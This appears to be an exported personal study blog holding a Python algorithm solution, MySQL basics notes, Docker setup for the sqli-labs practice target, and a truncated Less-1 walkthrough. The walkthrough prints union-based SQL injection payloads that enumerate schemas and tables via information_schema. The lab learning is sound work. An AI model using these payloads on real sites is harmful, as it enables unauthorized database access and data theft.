<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestConsecutive</span>(<span class="params">self, nums</span>):</span><br><span class="line">        hash_dict = <span class="built_in">dict</span>()</span><br><span class="line">        </span><br><span class="line">        max_length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> num <span class="keyword">not</span> <span class="keyword">in</span> hash_dict:</span><br><span class="line">                left = hash_dict.get(num - <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">                right = hash_dict.get(num + <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">                </span><br><span class="line">                cur_length = <span class="number">1</span> + left + right</span><br><span class="line">                <span class="keyword">if</span> cur_length &gt; max_length:</span><br><span class="line">                    max_length = cur_length</span><br><span class="line">                </span><br><span class="line">                hash_dict[num] = cur_length</span><br><span class="line">                hash_dict[num - left] = cur_length</span><br><span class="line">                hash_dict[num + right] = cur_length</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> max_length</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="啥"><a href="#啥" class="headerlink" title="啥"></a>啥</h1><p>然后我最近干嘛了我也不知道<br>大概有<br><a href="https://zhuanlan.zhihu.com/p/165379391">VSCode搭建Python开发环境(含Python环境搭建)</a><br><a href="https://blog.csdn.net/thefg/article/details/128601410">2023年最新Python安装详细教程</a><br><a href="https://blog.csdn.net/qq_42412061/article/details/109718713">No module named ‘request’</a><br><a href="https://zhuanlan.zhihu.com/p/402166578">‘pip’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。</a><br><a href="https://blog.csdn.net/u010244992/article/details/105039778">ModuleNotFoundError: No module named ‘bs4’</a><br><a href="https://blog.csdn.net/weixin_38853585/article/details/89238982">kali虚拟机磁盘不足扩容</a><br><a href="https://blog.csdn.net/weixin_46136890/article/details/130750913?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-130750913-blog-89238982.235%5Ev38%5Epc_relevant_anti_vip_base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-130750913-blog-89238982.235%5Ev38%5Epc_relevant_anti_vip_base&utm_relevant_index=3">kali虚拟机根目录扩容（最有效最简洁）</a><br><a href="https://blog.csdn.net/lyc0424/article/details/106917167">linux &#x2F;dev&#x2F;sda1 磁盘满了，解决办法</a><br><a href="https://blog.csdn.net/weixin_44119101/article/details/105017632">kali虚拟机扩容详细教程</a><br><a href="https://bbs.kanxue.com/thread-248375.htm">[原创]sqli-labs靶场第七关文件无法写入</a><br><a href="https://zhuanlan.zhihu.com/p/379682771">你没有权限在此位置中保存文件</a><br><a href="https://zhuanlan.zhihu.com/p/403961135">找不到 gpedit.msc 的最优解决办法</a><br><a href="https://blog.csdn.net/Hunter_Murphy/article/details/109697249">ModuleNotFoundError: No module named ‘tqdm’</a><br><a href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向）</a><br><a href="https://greasyfork.org/zh-CN/scripts/415248-%E5%A4%8D%E5%88%B6%E7%BD%91%E9%A1%B5%E6%A0%87%E9%A2%98%E5%92%8C%E7%BD%91%E5%9D%80%E4%B8%BAmarkdown%E9%93%BE%E6%8E%A5">复制网页标题和网址为Markdown链接</a><br><a href="https://blog.csdn.net/heimu24/article/details/81210640?spm=1001.2101.3001.6650.5&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-5-81210640-blog-89496837.235%5Ev38%5Epc_relevant_anti_vip_base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-5-81210640-blog-89496837.235%5Ev38%5Epc_relevant_anti_vip_base&utm_relevant_index=6">hexo个人博客：换了电脑怎么办</a><br><a href="https://www.zhihu.com/question/21193762">使用hexo，如果换了电脑怎么更新博客？ - 知乎</a><br><a href="https://blog.csdn.net/m0_66964652/article/details/122882957?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-122882957-blog-107599437.235%5Ev38%5Epc_relevant_anti_vip_base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-122882957-blog-107599437.235%5Ev38%5Epc_relevant_anti_vip_base&utm_relevant_index=5">2022最新hexo最新搭建教程</a><br>还看了一些别人的wp啥的<br><a href="https://f0rk3b0mb.github.io/p/imaginaryctf2023/">ImaginaryCTF2023</a><br><a href="https://www.cnblogs.com/ZimaBlue/articles/17577500.html">ImaginaryCTF 2023 - ZimaB1ue - 博客园</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/288451281">解决Flash插件已被屏蔽的问题（谷歌、火狐、IE、Edge） - 知乎</a></p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>2023暑期学习week1</title>
    <url>/2023/07/12/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week1/</url>
    <content><![CDATA[<p>🚬🚬🚬</p>
<span id="more"></span>
<h1 id="MySQL学习笔记"><a href="#MySQL学习笔记" class="headerlink" title="MySQL学习笔记"></a>MySQL学习笔记</h1><p><a href="https://www.bilibili.com/video/BV1Vy4y1z7EX?p=7&spm_id_from=pageDriver&vd_source=6ed75b70097db8442c45039e306c5525">MySQL入门基础,mysql基础视频+数据库实战,老杜带你学</a></p>
<h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p>跟着视频打开mysql.exe后闪退，解决方法，将mysql.exe所在文件夹(C:\Program Files (x86)\MySQL\MySQL Server 5.5\bin)在终端打开&#x2F;cmd进入，输入<code>mysql -uroot -proot</code>.</p>
<h3 id="单元"><a href="#单元" class="headerlink" title="单元"></a>单元</h3><p>库databases-&gt;表table-&gt;数据&#x2F;记录row（行）&#x2F;字段column（列）</p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>退出<code>exit</code><br>查看mysql数据库的版本号<code>select version();</code></p>
<p>查看数据库<code>show databases; </code><br>使用某个数据库<code>use test;</code><br>查看当前数据库<code>select database();</code><br>创建数据库<code>create database xxx;</code></p>
<p>查看数据库下有哪些表<code>show tables;</code></p>
<p>终止<code>\c</code> <code>;</code></p>
<h3 id="语句分类"><a href="#语句分类" class="headerlink" title="语句分类"></a>语句分类</h3><p><strong>查询DQL</strong><br>select</p>
<p><strong>操作DML</strong>（数据）<br>insert 增<br>delete 删<br>update 改</p>
<p><strong>定义DDL</strong>（表的结构）<br>create 新建，等同于增<br>drop 删除<br>alter 修改</p>
<p><strong>事务控制语言TCL</strong></p>
<p><strong>数据控制语言DCL</strong></p>
<h3 id="导入数据库"><a href="#导入数据库" class="headerlink" title="导入数据库"></a>导入数据库</h3><p><code>source sql文件地址</code><br>ps：路径中不能有中文</p>
<h3 id="查询select…"><a href="#查询select…" class="headerlink" title="查询select…"></a>查询select…</h3><p><strong>查询字段</strong><br><code>select 字段名1(,字段名2,字段名3,...) from 表名; </code><br><code>select * from 表名;</code>（所有）</p>
<p><strong>给查询的列起别名</strong><br><code>select 字段名 as 别名 from 表名;</code><br>e.g:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">原来</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="operator">|</span> yuanlaide     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="operator">|</span> test1         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> test2         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line">输入</span><br><span class="line"><span class="keyword">select</span> yuanlaide (<span class="keyword">as</span>) change <span class="keyword">from</span> 表名;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> change     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> test1      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> test2      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br></pre></td></tr></table></figure>
<p>别名里面有空格用单引号括起来.</p>
<p><strong>字段可以使用数学表达式</strong></p>
<p><strong>查看表的结构</strong><br><code>desc 表名;</code></p>
<h3 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语法格式：</span><br><span class="line">	<span class="keyword">select</span></span><br><span class="line">		字段<span class="number">1</span>,字段<span class="number">2</span>,字段<span class="number">3.</span>...</span><br><span class="line">	<span class="keyword">from</span> </span><br><span class="line">		表名</span><br><span class="line">	<span class="keyword">where</span></span><br><span class="line">		条件;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">=</span> 等于</span><br><span class="line"><span class="operator">&lt;&gt;</span>或<span class="operator">!=</span> 不等于</span><br><span class="line"><span class="operator">&lt;</span> 小于</span><br><span class="line"><span class="operator">&lt;=</span> 小于等于</span><br><span class="line"><span class="operator">&gt;</span> 大于</span><br><span class="line"><span class="operator">&gt;=</span> 大于等于</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> 并且</span><br><span class="line"><span class="keyword">or</span> 或者(<span class="keyword">and</span>优先级高于<span class="keyword">or</span>)</span><br><span class="line"><span class="keyword">in</span> 包含，相当于多个 <span class="keyword">or</span>(<span class="keyword">in</span>不是一个区间。<span class="keyword">in</span>后面跟的是具体的值。)</span><br><span class="line"><span class="keyword">like</span> 模糊查询，支持<span class="operator">%</span>或下划线匹配</span><br><span class="line">	<span class="operator">%</span>匹配任意多个字符</span><br><span class="line">	下划线：任意一个字符。</span><br><span class="line">	（<span class="operator">%</span>是一个特殊的符号，_ 也是一个特殊符号）</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">between</span> … <span class="keyword">and</span> …. 两个值之间, 等同于 <span class="operator">&gt;=</span> <span class="keyword">and</span> <span class="operator">&lt;=</span></span><br><span class="line">e.g:</span><br><span class="line">	<span class="keyword">select</span> </span><br><span class="line">		empno,ename,sal </span><br><span class="line">	<span class="keyword">from</span> </span><br><span class="line">		emp </span><br><span class="line">	<span class="keyword">where</span> </span><br><span class="line">		sal <span class="operator">&gt;=</span> <span class="number">2450</span> <span class="keyword">and</span> sal <span class="operator">&lt;=</span> <span class="number">3000</span>;</span><br><span class="line"><span class="comment">-----------------------------</span></span><br><span class="line">	<span class="keyword">select</span> </span><br><span class="line">			empno,ename,sal </span><br><span class="line">		<span class="keyword">from</span> </span><br><span class="line">			emp </span><br><span class="line">		<span class="keyword">where</span> </span><br><span class="line">			sal <span class="keyword">between</span> <span class="number">2450</span> <span class="keyword">and</span> <span class="number">3000</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">is</span> <span class="keyword">null</span> (不能用等号)</span><br><span class="line"><span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>
<h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line">	字段<span class="number">1</span>,字段<span class="number">2</span>,字段<span class="number">3.</span>...</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">	表名</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line">	按什么排;</span><br></pre></td></tr></table></figure>
<p>(默认升序)</p>
<p><strong>降&#x2F;升</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line">	字段<span class="number">1</span>,字段<span class="number">2</span>,字段<span class="number">3.</span>...</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">	表名</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line">	按什么排 <span class="keyword">desc</span><span class="operator">/</span><span class="keyword">asc</span>;</span><br></pre></td></tr></table></figure>

<p>综</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">	...</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">	...</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">	...</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>（排序总是在最后执行）</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<h3 id="数据处理函数（单行处理函数）"><a href="#数据处理函数（单行处理函数）" class="headerlink" title="数据处理函数（单行处理函数）"></a>数据处理函数（单行处理函数）</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Lower 转换小写</span><br><span class="line">upper 转换大写</span><br><span class="line">substr 取子串（substr(被截取的字符串,起始下标[从<span class="number">1</span>开始],截取的长度)）</span><br><span class="line">length 取长度</span><br><span class="line">trim 去空格</span><br><span class="line">str_to_date 将字符串转换成日期</span><br><span class="line">date_format 格式化日期</span><br><span class="line">format 设置千分位</span><br><span class="line">round() 四舍五入</span><br><span class="line">rand 生成随机数</span><br><span class="line">Ifnull 可以将<span class="keyword">null</span>转换成一个具体值(<span class="keyword">NULL</span>参与运算，结果为<span class="keyword">NULL</span>)</span><br><span class="line">concat 字符串拼接</span><br><span class="line">case..when..then..when..then..else..end</span><br></pre></td></tr></table></figure>
<h3 id="分组函数（多行处理函数）"><a href="#分组函数（多行处理函数）" class="headerlink" title="分组函数（多行处理函数）"></a>分组函数（多行处理函数）</h3><ol>
<li>分组函数自动忽略NULL，你不需要提前对NULL进行处理。</li>
<li>分组函数不能够直接使用在where子句中。</li>
<li>分组函数可以组合起来一起用。<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">count	计数</span><br><span class="line"><span class="built_in">count</span>(具体字段)：表示统计该字段下所有不为<span class="keyword">NULL</span>的元素的总数。</span><br><span class="line"><span class="built_in">count</span>(<span class="operator">*</span>)：统计表当中的总行数。（只要有一行数据count则<span class="operator">+</span><span class="operator">+</span>）</span><br><span class="line">sum	求和</span><br><span class="line">avg	平均值</span><br><span class="line">max	最大值</span><br><span class="line">min	最小值</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h3><ol>
<li>where执行的时候，还没有分组。所以where后面不能出现分组函数。</li>
<li>在一条select语句当中，如果有group by语句的话，select后面只能跟：参加分组的字段，以及分组函数。其它的一律不能跟。</li>
<li>使用having可以对分完组之后的数据进一步过滤。having不能单独使用，having不能代替where，having必须和group by联合使用。<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">一个完整的 <span class="keyword">select</span> 语句格式如下</span><br><span class="line"><span class="keyword">select</span> 字段</span><br><span class="line"><span class="keyword">from</span> 表名</span><br><span class="line"><span class="keyword">where</span> …….</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> ……..</span><br><span class="line"><span class="keyword">having</span> …….(就是为了过滤分组后的数据而存在的—不可以单独的出现)</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> ……..</span><br><span class="line">以上语句的执行顺序</span><br><span class="line"><span class="number">1.</span> 首先执行 <span class="keyword">where</span> 语句过滤原始数据</span><br><span class="line"><span class="number">2.</span> 执行 <span class="keyword">group</span> <span class="keyword">by</span> 进行分组</span><br><span class="line"><span class="number">3.</span> 执行 <span class="keyword">having</span> 对分组数据进行操作</span><br><span class="line"><span class="number">4.</span> 执行 <span class="keyword">select</span> 选出数据</span><br><span class="line"><span class="number">5.</span> 执行 <span class="keyword">order</span> <span class="keyword">by</span> 排序</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="查询结果去除重复记录【distinct】"><a href="#查询结果去除重复记录【distinct】" class="headerlink" title="查询结果去除重复记录【distinct】"></a>查询结果去除重复记录【distinct】</h3><ol>
<li>原表数据不会被修改，只是查询结果去重。</li>
<li>distinct只能出现在所有字段的最前方。</li>
</ol>
<h3 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h3><p>跨表查询，多张表联合起来查询数据<br>两张表进行连接查询，没有任何条件限制的时候，最终查询结果条数，是两张表条数的乘积，这种现象被称为：<strong>笛卡尔积现象</strong>。<br>避免笛卡尔积现象：连接时加条件<br>效率：表起别名</p>
<h4 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h4><p>等值连接 （条件是等量关系，所以被称为等值连接。）<br>非等值连接 （条件不是一个等量关系，称为非等值连接。）<br>自连接</p>
<h4 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h4><p>左外连接（左连接） left<br>右外连接（右连接） right</p>
<h3 id="多张表"><a href="#多张表" class="headerlink" title="多张表"></a>多张表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line">	...</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">	a</span><br><span class="line"><span class="keyword">join</span></span><br><span class="line">	b</span><br><span class="line"><span class="keyword">on</span></span><br><span class="line">	a和b的连接条件</span><br><span class="line"><span class="keyword">join</span></span><br><span class="line">	c</span><br><span class="line"><span class="keyword">on</span></span><br><span class="line">	a和c的连接条件</span><br><span class="line"><span class="keyword">right</span> <span class="keyword">join</span></span><br><span class="line">	d</span><br><span class="line"><span class="keyword">on</span></span><br><span class="line">	a和d的连接条件</span><br></pre></td></tr></table></figure>

<h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>select语句中嵌套select语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">	..(<span class="keyword">select</span>).</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">	..(<span class="keyword">select</span>).</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">	..(<span class="keyword">select</span>).</span><br></pre></td></tr></table></figure>

<h3 id="union合并查询"><a href="#union合并查询" class="headerlink" title="union合并查询"></a>union合并查询</h3><p>要求两个结果集的列数相同。</p>
<h3 id="limit将查询结果集的一部分取出"><a href="#limit将查询结果集的一部分取出" class="headerlink" title="limit将查询结果集的一部分取出"></a>limit将查询结果集的一部分取出</h3><p>mysql当中limit在order by之后执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit startIndex, length</span><br><span class="line">startIndex是起始下标，length是长度。</span><br><span class="line">起始下标从0开始。</span><br></pre></td></tr></table></figure>

<h3 id="综"><a href="#综" class="headerlink" title="综"></a>综</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line">   ...</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">   ...</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">   ...</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">   ...</span><br><span class="line"><span class="keyword">having</span></span><br><span class="line">   ...</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line">   ...</span><br><span class="line">limit</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">执行顺序？</span><br><span class="line">   <span class="number">1.</span><span class="keyword">from</span></span><br><span class="line">   <span class="number">2.</span><span class="keyword">where</span></span><br><span class="line">   <span class="number">3.</span><span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">   <span class="number">4.</span><span class="keyword">having</span></span><br><span class="line">   <span class="number">5.</span><span class="keyword">select</span></span><br><span class="line">   <span class="number">6.</span><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line">   <span class="number">7.</span>limit..</span><br></pre></td></tr></table></figure>

<h3 id="表-create-drop-alter"><a href="#表-create-drop-alter" class="headerlink" title="表(create drop alter)"></a>表(create drop alter)</h3><p>建表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(字段名<span class="number">1</span> 数据类型, 字段名<span class="number">2</span> 数据类型, 字段名<span class="number">3</span> 数据类型);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">	字段名<span class="number">1</span> 数据类型, </span><br><span class="line">	字段名<span class="number">2</span> 数据类型, </span><br><span class="line">	字段名<span class="number">3</span> 数据类型</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>数据类型</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="type">varchar</span>(最长<span class="number">255</span>)</span><br><span class="line">	可变长度的字符串</span><br><span class="line">	比较智能，节省空间。</span><br><span class="line">	会根据实际的数据长度动态分配空间。</span><br><span class="line"></span><br><span class="line">	优点：节省空间</span><br><span class="line">	缺点：需要动态分配空间，速度慢。</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>(最长<span class="number">255</span>)</span><br><span class="line">	定长字符串</span><br><span class="line">	不管实际的数据长度是多少。</span><br><span class="line">	分配固定长度的空间去存储数据。</span><br><span class="line">	使用不恰当的时候，可能会导致空间的浪费。</span><br><span class="line"></span><br><span class="line">	优点：不需要动态分配空间，速度快。</span><br><span class="line">	缺点：使用不当可能会导致空间的浪费。</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="type">int</span>(最长<span class="number">11</span>)</span><br><span class="line">	数字中的整数型。等同于java的<span class="type">int</span>。</span><br><span class="line"></span><br><span class="line"><span class="type">bigint</span></span><br><span class="line">	数字中的长整型。等同于java中的long。</span><br><span class="line"></span><br><span class="line"><span class="type">float</span>	</span><br><span class="line">	单精度浮点型数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span></span><br><span class="line">	双精度浮点型数据</span><br><span class="line"></span><br><span class="line"><span class="type">date</span></span><br><span class="line">	短日期类型</span><br><span class="line"></span><br><span class="line">datetime</span><br><span class="line">	长日期类型</span><br><span class="line"></span><br><span class="line"><span class="type">clob</span></span><br><span class="line">	字符大对象</span><br><span class="line">	最多可以存储<span class="number">4</span>G的字符串。</span><br><span class="line">	比如：存储一篇文章，存储一个说明。</span><br><span class="line">	超过<span class="number">255</span>个字符的都要采用<span class="type">CLOB</span>字符大对象来存储。</span><br><span class="line">	<span class="type">Character</span> <span class="type">Large OBject</span>:<span class="type">CLOB</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">blob</span></span><br><span class="line">	二进制大对象</span><br><span class="line">	<span class="type">Binary</span> <span class="type">Large OBject</span></span><br><span class="line">	专门用来存储图片、声音、视频等流媒体数据。</span><br><span class="line">	往<span class="type">BLOB</span>类型的字段上插入数据的时候，例如插入一个图片、视频等，</span><br><span class="line">	你需要使用IO流才行。</span><br></pre></td></tr></table></figure>

<p>删除表(如果存在)<br><code>drop table (if exists) 表名;</code></p>
<p>插入数据<br><code>insert into 表名(字段名1,字段名2,字段名3...) values(值1,值2,值3);</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user(id,name,birth,create_time) <span class="keyword">values</span></span><br><span class="line">(<span class="number">1</span>,<span class="string">&#x27;zs&#x27;</span>,<span class="string">&#x27;1980-10-11&#x27;</span>,now()), </span><br><span class="line">(<span class="number">2</span>,<span class="string">&#x27;lisi&#x27;</span>,<span class="string">&#x27;1981-10-11&#x27;</span>,now()),</span><br><span class="line">(<span class="number">3</span>,<span class="string">&#x27;wangwu&#x27;</span>,<span class="string">&#x27;1982-10-11&#x27;</span>,now());</span><br></pre></td></tr></table></figure>

<p>日期相关</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">str_to_date</span><br><span class="line">date_format</span><br><span class="line"><span class="type">date</span> 短</span><br><span class="line">datetime 长</span><br><span class="line">id 整数</span><br><span class="line">name 字符串</span><br><span class="line">birth 短日期</span><br><span class="line">create_time 这条记录的创建时间：长日期类型</span><br><span class="line">mysql短日期默认格式：<span class="operator">%</span>Y<span class="operator">-</span><span class="operator">%</span>m<span class="operator">-</span><span class="operator">%</span>d</span><br><span class="line">mysql长日期默认格式：<span class="operator">%</span>Y<span class="operator">-</span><span class="operator">%</span>m<span class="operator">-</span><span class="operator">%</span>d <span class="operator">%</span>h:<span class="operator">%</span>i:<span class="operator">%</span>s</span><br><span class="line">now() 系统当前时间(包含时分秒：datetime类型)</span><br></pre></td></tr></table></figure>

<p>改<br><code>update 表名 set 字段名1=值1,字段名2=值2,字段名3=值3... where 条件;</code><br>没有条件限制会导致所有数据全部更新。</p>
<p>删<br><code>delete from 表名 where 条件;</code></p>
<h2 id="34道作业题"><a href="#34道作业题" class="headerlink" title="34道作业题"></a>34道作业题</h2><ol>
<li><p>分组函数、分组查询<br><code>select deptno,max(sal) as maxsal from emp group by deptno;</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line">	e.ename, t.<span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line">	emp e</span><br><span class="line"><span class="keyword">join</span></span><br><span class="line">	(<span class="keyword">select</span> deptno,<span class="built_in">max</span>(sal) <span class="keyword">as</span> maxsal <span class="keyword">from</span> emp <span class="keyword">group</span> <span class="keyword">by</span> deptno) t</span><br><span class="line"><span class="keyword">on</span></span><br><span class="line">	t.deptno <span class="operator">=</span> e.deptno <span class="keyword">and</span> t.maxsal <span class="operator">=</span> e.sal;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>select deptno,avg(sal) as avgsal from emp group by deptno;</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line">	 e.ename, t.<span class="operator">*</span>,e.sal</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">	emp e</span><br><span class="line"><span class="keyword">join</span></span><br><span class="line">	(<span class="keyword">select</span> deptno,<span class="built_in">avg</span>(sal) <span class="keyword">as</span> avgsal <span class="keyword">from</span> emp <span class="keyword">group</span> <span class="keyword">by</span> deptno) t</span><br><span class="line"><span class="keyword">on</span></span><br><span class="line">	e.deptno <span class="operator">=</span> t.deptno <span class="keyword">and</span> e.sal <span class="operator">&gt;</span> t.avgsal;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="docker安装及配置及问题及解决问题"><a href="#docker安装及配置及问题及解决问题" class="headerlink" title="docker安装及配置及问题及解决问题"></a>docker安装及配置及问题及解决问题</h1><p><a href="https://blog.csdn.net/chenthe1/article/details/129461741">安装</a><br><a href="https://blog.csdn.net/maymaysun/article/details/124678398">没有Hyper-V</a><br><a href="https://blog.csdn.net/LeungSr/article/details/117900614">出现install WSL2 kernel update的情况</a></p>
<h2 id="靶机搭建"><a href="#靶机搭建" class="headerlink" title="靶机搭建"></a>靶机搭建</h2><ol>
<li><p>运行：<code>docker info</code><br>出现balbala一大串和</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WARNING: No blkio throttle.read_bps_device support</span><br><span class="line">WARNING: No blkio throttle.write_bps_device support</span><br><span class="line">WARNING: No blkio throttle.read_iops_device support</span><br><span class="line">WARNING: No blkio throttle.write_iops_device support</span><br></pre></td></tr></table></figure>
<p>百度了一下不重要</p>
</li>
<li><p>搜索sqli-labs：<code>docker search sqli-labs</code></p>
</li>
<li><p>建立镜像：<code>docker pull acgpiano/sqli-labs</code></p>
</li>
<li><p>查看存在的镜像：<code>docker images</code></p>
</li>
<li><p>运行存在的镜像：<code>docker run -dt --name sqli-labs -p 80:80 --rm acgpiano/sqli-labs</code></p>
</li>
</ol>
<p>浏览器打开<a href="http://127.0.0.1/%E5%8D%B3%E5%8F%AF">http://127.0.0.1/即可</a></p>
<p>以后重新开机，只要启动<br>docker start sqli-labs</p>
<p>出现问题：Unable to connect to the database:security<br><a href="https://blog.csdn.net/weixin_43198291/article/details/116423461">docker 运行 sqli-labs（ Unable to connect to the database:security）问题解决</a></p>
<h1 id="sqlilabs"><a href="#sqlilabs" class="headerlink" title="sqlilabs"></a>sqlilabs</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;order by 3 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,2,3--+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">--+ </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span 